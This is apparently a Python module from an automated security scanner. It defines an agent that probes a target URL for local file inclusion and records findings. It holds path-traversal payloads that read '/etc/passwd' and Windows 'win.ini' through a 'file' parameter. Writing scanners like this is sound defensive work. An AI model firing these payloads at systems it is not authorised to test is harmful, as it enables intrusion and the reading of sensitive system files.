# agents/specialists/lfi_specialist.py
import logging
import uuid
from typing import List

import aiohttp

from agents.specialist_base import ISpecialist
from core.types import MultiSessionContext, TargetScope, VulnCategory
from triage.noise_filter import Finding

logger = logging.getLogger(__name__)


class LFISpecialist(ISpecialist):
    """Local File Inclusion (LFI) specialist agent."""

    @property
    def category(self) -> VulnCategory:
        return VulnCategory.LFI

    async def scan(
        self,
        target: str,
        scope: TargetScope,
        session_ctx: MultiSessionContext,
        correlation_id: str,
    ) -> List[Finding]:
        findings = []

        if await self.check_false_positive(target):
            return findings

        payloads = [
            "/etc/passwd",
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "C:\\windows\\win.ini",
        ]

        async with aiohttp.ClientSession() as session:
            for p in payloads:
                test_url = f"{target}?file={p}"
                try:
                    async with session.get(test_url, timeout=10) as response:
                        body = await response.text()
                        if "root:x:" in body or "[extensions]" in body:
                            finding = Finding(
                                finding_id=f"lfi_{uuid.uuid4().hex[:8]}",
                                title="Local File Inclusion Detected",
                                description=f"Successfully read local system file using payload: {p}",
                                vuln_category=self.category.value,
                                endpoint=target,
                                evidence={
                                    "payload": p,
                                    "url": test_url,
                                    "response": body[:200],
                                },
                                confidence=0.95,
                            )
                            findings.append(finding)
                except Exception as e:
                    logger.warning(f"Error requesting {test_url}: {e}")

        return findings
